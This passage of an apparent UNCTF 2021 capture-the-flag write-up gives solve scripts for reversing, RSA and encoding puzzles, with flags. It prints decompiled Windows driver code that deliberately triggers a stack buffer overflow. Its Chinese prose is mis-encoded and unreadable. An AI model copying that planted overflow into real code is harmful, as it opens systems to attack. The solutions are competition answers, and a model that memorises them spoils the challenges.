class="built_in">bytes</span>(t))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;UNCTF&#123;b781cbb29054db&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>flagï¼š<code>UNCTF&#123;b781cbb29054db&#125;</code></p><p>â€‹    </p><h3 id="py-trade"><a href="#py-trade" class="headerlink" title="py_trade"></a>py_trade</h3><blockquote><p>EZ opcode! Give me your PY, and iâ€™ll give you flag!</p></blockquote><p>è¿˜åŸpythonå­—èŠ‚ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&#x27;XXXXXX&#x27;</span></span><br><span class="line">num = [<span class="number">0</span>]*<span class="number">18</span></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    num[i] = (<span class="built_in">ord</span>(flag[i])+i)^(k%<span class="number">3</span>+<span class="number">1</span>)</span><br><span class="line">    num[<span class="built_in">len</span>(flag)-i-<span class="number">1</span>] = (<span class="built_in">ord</span>(flag[<span class="built_in">len</span>(flag)-i-<span class="number">1</span>])+<span class="built_in">len</span>(flag)-i-<span class="number">1</span>)^(k%<span class="number">3</span>+<span class="number">1</span>)</span><br><span class="line">    k += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(num)</span><br><span class="line"><span class="comment">#[115, 120, 96, 84, 116, 103, 105, 56, 102, 59, 127, 105, 115, 128, 95, 124, 139, 49]</span></span><br></pre></td></tr></table></figure><p>ç”¨z3è§£ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">s = Solver()</span><br><span class="line">num = [<span class="number">115</span>, <span class="number">120</span>, <span class="number">96</span>, <span class="number">84</span>, <span class="number">116</span>, <span class="number">103</span>, <span class="number">105</span>, <span class="number">56</span>, <span class="number">102</span>, <span class="number">59</span>, <span class="number">127</span>, <span class="number">105</span>, <span class="number">115</span>, <span class="number">128</span>, <span class="number">95</span>, <span class="number">124</span>, <span class="number">139</span>, <span class="number">49</span>]</span><br><span class="line">flag = [BitVec(<span class="string">&#x27;flag%d&#x27;</span>%i,<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(num))]</span><br><span class="line">res = [-<span class="number">1</span>]*<span class="built_in">len</span>(num)</span><br><span class="line"></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(num)):</span><br><span class="line">    res[i] = (flag[i]+i)^(k%<span class="number">3</span>+<span class="number">1</span>)</span><br><span class="line">    res[<span class="built_in">len</span>(flag)-i-<span class="number">1</span>] = (flag[<span class="built_in">len</span>(flag)-i-<span class="number">1</span>]+<span class="built_in">len</span>(flag)-i-<span class="number">1</span>)^(k%<span class="number">3</span>+<span class="number">1</span>)</span><br><span class="line">    k += <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(num)):</span><br><span class="line">    s.add(res[i]==num[i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(m[i].as_long()) <span class="keyword">for</span> i <span class="keyword">in</span> flag))</span><br><span class="line">    </span><br><span class="line"><span class="comment"># py_Trad3_1s_fuNny!</span></span><br></pre></td></tr></table></figure><p>flagï¼š<code>unctf&#123;py_Trad3_1s_fuNny!&#125;</code></p><p>â€‹    </p><h3 id="ezDriver"><a href="#ezDriver" class="headerlink" title="ezDriver"></a>ezDriver</h3><blockquote><p>ä½ äº†è§£è¿‡é©±åŠ¨å˜›ï¼Ÿè¯•è¯•çœ‹å§ï¼</p></blockquote><p>åˆ†æé€»è¾‘ï¼Œ<code>DriverEntry()</code> -&gt; <code>sub_140086000()</code> -&gt; <code>sub_140085268()</code> -&gt; <code>sub_140085000()</code> -&gt; <code>sub_140085020()</code>ã€‚</p><p>ä¸»ç¨‹åºé€»è¾‘åœ¨ <code>sub_140085020()</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_140085020</span><span class="params">(<span class="keyword">volatile</span> <span class="type">void</span> *Address, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// ecx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// ecx</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+20h] [rbp-828h]</span></span><br><span class="line">  <span class="type">char</span> v10[<span class="number">2048</span>]; <span class="comment">// [rsp+30h] [rbp-818h] BYREF</span></span><br><span class="line"></span><br><span class="line">  sub_140001640(v10, <span class="number">0</span>i64, <span class="number">2048</span>i64);</span><br><span class="line">  ProbeForRead(Address, <span class="number">0x800</span>ui64, <span class="number">1u</span>);</span><br><span class="line">  DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] UserBuffer: 0x%p\n&quot;</span>, (<span class="type">const</span> <span class="type">void</span> *)Address);</span><br><span class="line">  DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] UserBuffer Size: 0x%zX\n&quot;</span>, a2);</span><br><span class="line">  DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] KernelBuffer: 0x%p\n&quot;</span>, v10);</span><br><span class="line">  DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] KernelBuffer Size: 0x%zX\n&quot;</span>, <span class="number">0x800</span>ui64);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  LODWORD(v9) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( (<span class="type">unsigned</span> __int64)v4 &lt; <span class="number">0x200</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    byte_140083090[v4] = v10[<span class="number">4</span> * v4];</span><br><span class="line">    LODWORD(v9) = ++v4;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_140001000(byte_140083090, (<span class="type">unsigned</span> <span class="type">int</span>)dword_140003028, &amp;unk_140003030);<span class="comment">// XXTEAåŠ å¯†</span></span><br><span class="line">  v5 = <span class="number">-1</span>i64;</span><br><span class="line">  v6 = <span class="number">-1</span>i64;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    ++v6;</span><br><span class="line">  <span class="keyword">while</span> ( byte_140003000[v6] );</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    ++v5;</span><br><span class="line">  <span class="keyword">while</span> ( byte_140083090[v5] );</span><br><span class="line">  <span class="keyword">if</span> ( v5 == v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="number">0</span>;</span><br><span class="line">    HIDWORD(v9) = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( v8 &lt; v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( byte_140003000[v8] != byte_140083090[v8] )<span class="comment">// æ¯”è¾ƒ</span></span><br><span class="line">      &#123;</span><br><span class="line">        DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[*] flag wrong!&quot;</span>, byte_140003000, v9);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">      &#125;</span><br><span class="line">      HIDWORD(v9) = ++v8;</span><br><span class="line">    &#125;</span><br><span class="line">    DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[*] you are right@&quot;</span>, byte_140003000, v9);</span><br><span class="line">    DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Triggering Buffer Overflow in Stack\n&quot;</span>);</span><br><span class="line">    sub_140001380(v10, Address, a2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[*] flag Wrong!&quot;</span>, byte_140003000, v9);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°é€šè¿‡åŠ å¯†å‡½æ•° <code>sub_140001000()</code> åï¼Œå¾—åˆ°çš„ç»“æœ <code>byte_140083090</code> ä¸ <code>byte_140003000</code> ä½œæ¯”è¾ƒã€‚</p><p>è·Ÿè¿›åŠ å¯†å‡½æ•° <code>sub_140001000()</code>ï¼Œç”±ç‰¹å¾çŸ¥ä¸ºXXTEAåŠ å¯†ç®—æ³•ï¼Œä½¿ç”¨çš„keyä¸º <code>unk_140003030=[1,2,3,4]</code>ã€‚</p><p>è„šæœ¬è§£å¯†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">shift</span>(<span class="params">z, y, x, k, p, e</span>):</span><br><span class="line">    <span class="keyword">return</span> ((((z &gt;&gt; <span class="number">5</span>) ^ (y &lt;&lt; <span class="number">2</span>)) + ((y &gt;&gt; <span class="number">3</span>) ^ (z &lt;&lt; <span class="number">4</span>))) ^ ((x ^ y) + (k[(p &amp; <span class="number">3</span>) ^ e] ^ z)))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">v, k</span>):</span><br><span class="line">    delta = <span class="number">0x9E3779B9</span></span><br><span class="line">    n = <span class="built_in">len</span>(v)</span><br><span class="line">    rounds = <span class="number">6</span> + <span class="number">52</span> // n</span><br><span class="line">    x = (rounds * delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    y = v[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rounds):</span><br><span class="line">        e = (x &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">            z = v[p - <span class="number">1</span>]</span><br><span class="line">            v[p] = (v[p] - shift(z, y, x, k, p, e)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            y = v[p]</span><br><span class="line">        p -= <span class="number">1</span></span><br><span class="line">        z = v[n - <span class="number">1</span>]</span><br><span class="line">        v[<span class="number">0</span>] = (v[<span class="number">0</span>] - shift(z, y, x, k, p, e)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        y = v[<span class="number">0</span>]</span><br><span class="line">        x = (x - delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    key = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line">    s = <span class="string">&#x27;184E8E7F2E69B702EEAA503990DEE59FAE4C4D06937164208B0234B83CA1884A21671A3783D1F2B1&#x27;</span></span><br><span class="line">    s = [s[<span class="number">8</span>*k:<span class="number">8</span>*k+<span class="number">8</span>] <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)//<span class="number">8</span>)]</span><br><span class="line">    s = [<span class="built_in">bytes</span>.fromhex(k)[::-<span class="number">1</span>].<span class="built_in">hex</span>() <span class="keyword">for</span> k <span class="keyword">in</span> s]</span><br><span class="line">    encrypted = [<span class="built_in">int</span>(k,<span class="number">16</span>) <span class="keyword">for</span> k <span class="keyword">in</span> s]</span><br><span class="line">    decrypted = decrypt(encrypted, key)</span><br><span class="line">    decrypted = [<span class="built_in">hex</span>(k)[<span class="number">2</span>:] <span class="keyword">for</span> k <span class="keyword">in</span> decrypted][:-<span class="number">1</span>]</span><br><span class="line">    flag = [<span class="built_in">bytes</span>.fromhex(k)[::-<span class="number">1</span>] <span class="keyword">for</span> k <span class="keyword">in</span> decrypted]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">b&#x27;&#x27;</span>.join(flag))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;unctf&#123;Do_you_want_to_a_cup_of_tea?&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>flagï¼š<code>unctf&#123;Do_you_want_to_a_cup_of_tea?&#125;</code></p><p>â€‹    </p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="# Crypto"></a># Crypto</h2><h3 id="easy-rsa"><a href="#easy-rsa" class="headerlink" title="easy_rsa"></a>easy_rsa</h3><blockquote><p>ç®€å•çš„RSA</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">q= <span class="number">9961202707366965556741565662110710902919441271996809241009358666778850435448710324711706845973820669201482939820488174382325795134659313309606698334978471</span></span><br><span class="line">p= <span class="number">12525187149887628510447403881107442078833803097302579419605689530714690308437476207855511625840027119860834633695330551080761572835309850579517639206740101</span></span><br><span class="line">c= <span class="number">28587419802025513525354713621431206010395084854419372005671024739235625817936539010481222419824634956610184430308528941304950093228826213143262329902946812513518444587906469224383320964300417189270202019231856531012143472434842753891213128487132962453421971000901646523331476667655739056951415917218673801225</span></span><br><span class="line">e = <span class="number">65537</span></span><br></pre></td></tr></table></figure></blockquote><p>RSAåŸºæ“ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">q = <span class="number">9961202707366965556741565662110710902919441271996809241009358666778850435448710324711706845973820669201482939820488174382325795134659313309606698334978471</span></span><br><span class="line">p =  <span class="number">12525187149887628510447403881107442078833803097302579419605689530714690308437476207855511625840027119860834633695330551080761572835309850579517639206740101</span></span><br><span class="line">c = <span class="number">28587419802025513525354713621431206010395084854419372005671024739235625817936539010481222419824634956610184430308528941304950093228826213143262329902946812513518444587906469224383320964300417189270202019231856531012143472434842753891213128487132962453421971000901646523331476667655739056951415917218673801225</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">fn = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,fn)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,p*q)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;UNCTF&#123;Th1s_1s_f1ag_f0r_unctf_2021!!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="æ¢ç§˜ä¸­ä¸–çºªåŸå ¡"><a href="#æ¢ç§˜ä¸­ä¸–çºªåŸå ¡" class="headerlink" title="æ¢ç§˜ä¸­ä¸–çºªåŸå ¡"></a>æ¢ç§˜ä¸­ä¸–çºªåŸå ¡</h3><blockquote><p>è´æ‹‰åœ¨å‚è§‚ä¸€ä¸ªä¸­ä¸–çºªçš„å¤å ¡æ—¶ï¼Œåœ¨æ¡Œä¸Šçœ‹åˆ°äº†ä¸€ä¸²ä¸€å¥‡æ€ªçš„å­—ç¬¦å’Œæè¿°ã€‚ä½ èƒ½å¸®å¤§èªæ˜ç ´è§£çš‡çˆéª‘å£«ç•™ä¸‹æ¥çš„è°œå›¢å—ï¼Ÿ</p><p>å¹´è½»çš„å¤§å¸ç‡é¢†ç€64ä½çš‡çˆéª‘å£«å†²ç ´äº†åŒé‡é˜»æ å¤ºä¸‹äº†åŸæ± ã€‚<br>AZSLh2OofBA0C2qzi25mg2KsYqW7iCSdDq9aBLKsDBWyi259</p></blockquote><p>ROT21+base64+æ …æ 2ã€‚</p><p>flagï¼š<code>UNCTF&#123;subscribe_to_Xiangwandamowang&#125;</code></p><p>â€‹    </p><h3 id="åˆ†æbadusbæµé‡"><a href="#åˆ†æbadusbæµé‡" class="headerlink" title="åˆ†æbadusbæµé‡"></a>åˆ†æbadusbæµé‡</h3><blockquote><p>ä¸€æ—¥ï¼ŒæŸä¼ä¸šçš„å®‰å…¨ç®¡ç†å‘˜å‘ç°ä¼ä¸šä¸­çš„ç”µè„‘é­åˆ°äº†badusbçš„ä¾µå®³ï¼Œä»¥ä¸‹ä»–åˆ†ç¦»å‡ºæ¥çš„æœ‰é—®é¢˜USBæµé‡ï¼Œè€Œè¿™ä¼¼ä¹è·Ÿé”®ç›˜çš„é”®ä½æ˜ å°„æœ‰å…³ã€‚</p><p>2018 2011 2006 2017 2009 202f 201C 0027 0018 002D 2004 0015 0008 002D 0019 0008 0015 001C 002D 0011 001E 0006 0008 2030</p></blockquote><p>é”®ç›˜é”®ä½æ˜ å°„è§„åˆ™ï¼Œæ˜ å°„å…³ç³»å‚è€ƒ<a href="https://wenku.baidu.com/view/9050c3c3af45b307e971971e.html">ã€ŠUSBé”®ç›˜åè®®ä¸­é”®ç ã€‹ä¸­çš„HID Usage ID</a>ã€‚</p><p>å‰ä¸¤ä½20ä»£è¡¨å¤§å†™ï¼Œ10ä»£è¡¨å°å†™ï¼Œåä¸¤ä½ä¸ºé”®ç ï¼Œå¯¹ç…§å†™flagã€‚</p><p>flagï¼š<code>UNCTF&#123;Y0u-Are-very-n1ce&#125;</code></p><p>â€‹    </p><h3 id="baby-rsa"><a href="#baby-rsa" class="headerlink" title="baby_rsa"></a>baby_rsa</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line">flag=<span class="string">&quot;unctf&#123;&quot;</span>+<span class="built_in">str</span>(uuid.uuid4())+<span class="string">&quot;&#125;&quot;</span></span><br><span class="line">m=libnum.s2n(flag)</span><br><span class="line"></span><br><span class="line">p=libnum.generate_prime(<span class="number">1024</span>)</span><br><span class="line">q=libnum.generate_prime(<span class="number">1024</span>)</span><br><span class="line">n=p*q</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">c=<span class="built_in">pow</span>(m*p+n,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e=&quot;</span>,e)</span><br><span class="line"><span class="comment">#n= 27023180567533176673625876001733765250439008888496677405372613659387969480500400831799338479404533734632060401129194207025095826786316107611502577395964365591899893794206238112244571942694129959717225168573059987542436467778426312967832431595178558711258027999897974942046398583397445299861338203860420721585460676138091828032223153425728023656897880166788811969523526091221520293020106530587453637600349533427641518473788620430866128331962450325767202417824455886116760280239705754222948387172102353564657340216229891342124971948458724351338597649821310431397426705701275774039588035776573373417654649168810548916141</span></span><br><span class="line"><span class="comment">#c= 3489599657527403893851973553294684608504140532554562294027722218597464669848608337663997115805201027340092733823019661706872544231209523772845492398492677185660213963118144668038183924970370481476141221609706208064428560732214361469135212057355342825193598971775551833240699393482839422273480793244841531126642199202744610656153155545415859410361595564197685655133074582118230993519133935533313364233668337427608419528430102794052261190930670933657287272452581248934890029409559234507626012423255430699687038808658327174609660874748540185589263800447650242593224189976058739054174360024536594384447518687126891675059</span></span><br><span class="line"><span class="comment">#e= 65537</span></span><br></pre></td></tr></table></figure></blockquote><p>$c = (mp+n)^e \% n = p^e(m+q)^e \% n $ï¼Œ</p><p>æœ‰ $c\%p = p^e(m+q)^e \% p = \Big((p^e \% p)\big((m+q)^e \% p\big)\Big) \% p=0$ï¼Œ</p><p>æ•… $c=kp$ï¼Œåˆ $n=pq$ï¼Œåˆ™ $p=\gcd(c,n)$ã€‚</p><p>æ±‚å‡º $d \equiv e^{-1} \pmod {\varphi(n)}$ï¼Œå¯ä»¥å¾—åˆ° $mâ€™ = mp+n = c^d \% n$ï¼Œæ‰€ä»¥ $m = \cfrac{mâ€™-n}{p}$ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">27023180567533176673625876001733765250439008888496677405372613659387969480500400831799338479404533734632060401129194207025095826786316107611502577395964365591899893794206238112244571942694129959717225168573059987542436467778426312967832431595178558711258027999897974942046398583397445299861338203860420721585460676138091828032223153425728023656897880166788811969523526091221520293020106530587453637600349533427641518473788620430866128331962450325767202417824455886116760280239705754222948387172102353564657340216229891342124971948458724351338597649821310431397426705701275774039588035776573373417654649168810548916141</span></span><br><span class="line">c = <span class="number">3489599657527403893851973553294684608504140532554562294027722218597464669848608337663997115805201027340092733823019661706872544231209523772845492398492677185660213963118144668038183924970370481476141221609706208064428560732214361469135212057355342825193598971775551833240699393482839422273480793244841531126642199202744610656153155545415859410361595564197685655133074582118230993519133935533313364233668337427608419528430102794052261190930670933657287272452581248934890029409559234507626012423255430699687038808658327174609660874748540185589263800447650242593224189976058739054174360024536594384447518687126891675059</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = gcd(n,c)</span><br><span class="line">q = n//p</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">fn = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,fn)</span><br><span class="line">m = <span class="built_in">int</span>(<span class="built_in">pow</span>(c,d,n)-n)//p</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;unctf&#123;rsa_s1mp1e_0kk&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>flagï¼š<code>unctf&#123;rsa_s1mp1e_0kk&#125;</code></p><p>â€‹    </p><h3 id="ç”µä¿¡è¯ˆéª—pro"><a href="#ç”µä¿¡è¯ˆéª—pro" class="headerlink" title="ç”µä¿¡è¯ˆéª—pro"></a>ç”µä¿¡è¯ˆéª—pro</h3><blockquote><p>æœ•æ˜¯ç§¦å§‹çš‡ï¼Œå…¶å®æœ•æ²¡æœ‰æ­»ï¼Œæœ•åœ¨è¥¿å®‰å…µé©¬ä¿‘ç¬¬å››ä¸ªå‘ç¬¬ä¸ƒæ’ï¼Œæœ•æ˜¯åƒäº†é•¿ç”Ÿä¸è€è¯çš„ï¼Œæœ•å‘Šè¯‰ä½ å•Šï¼Œæœ•åœ¨é™•è¥¿æœ‰3000å¨é»„é‡‘å’Œ300ä¸‡ç§¦å…µè¢«å°å°ï¼Œç°åœ¨åªéœ€è¦30å…ƒå°±èƒ½è§£å°ï¼Œåªè¦ä½ æ‰“é’±ç»™æœ•ï¼Œæœ•æ˜å¤©ç›´æ¥å¸¦éƒ¨é˜Ÿå¤æ´»ï¼Œè®©ä½ ç»Ÿé¢†ä¸‰å†›!å»ºç«‹åƒå¤ç½—é©¬ä¸€æ ·çš„å¸å›½ï¼Œå›æ— æˆè¨€ï¼ æœ•çš„è´¦æˆ·æ˜¯<code>5.#4&amp;;Sw)2Ti%*Sj1eUU9kTwi*Sj)1S&quot;a8S0)6x-8(x7=</code></p><p>flagæ ¼å¼ä¸ºunctf{}</p></blockquote><p>å°è¯•å¼‚æˆ–çˆ†ç ´ï¼Œå‘ç°å¼‚æˆ–0x40æœ‰ <code>unctf&#123;.7ir.)ej.*q%..y+.7)j.*iq.b!x.piv8mxh8w&#125;</code>ï¼Œè¯´æ˜ä¸­é—´åŠ å¯†æ–¹å¼ä¸åŒã€‚</p><p>æå–ä¸­é—´éƒ¨åˆ†å°è¯•å‡ºæ˜¯ROT47+å‡¯æ’’17ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">&#x27;$HXa%:TY$;`6&amp;&amp;h&lt;%H:Y$;X`$Q2g$_XeI\gWIf&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">200</span>,<span class="number">200</span>):</span><br><span class="line">    t=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(s[j])+i &gt;=<span class="number">32</span> <span class="keyword">and</span> <span class="built_in">ord</span>(s[j])+i&lt;<span class="number">127</span>:</span><br><span class="line">            t+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(s[j])+i)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(t)==<span class="built_in">len</span>(s):</span><br><span class="line">        <span class="built_in">print</span>(i,t)</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ <code>5Yir6Kej5LqG77yM6YKj5Liq5bCx5pivZmxhZw</code> base64è§£ç æ˜¯ <code>åˆ«è§£äº†ï¼Œé‚£ä¸ªå°±æ˜¯flag</code>ã€‚</p><p>flagï¼š<code>unctf&#123;5Yir6Kej5LqG77yM6YKj5Liq5bCx5pivZmxhZw&#125;</code></p><p>â€‹    </p><h2 id="Misc"><a href="#Misc" class="headerlink" title="# Misc"></a># Misc</h2><h3 id="ç®€å•æ—¥å¿—å®¡è®¡"><a 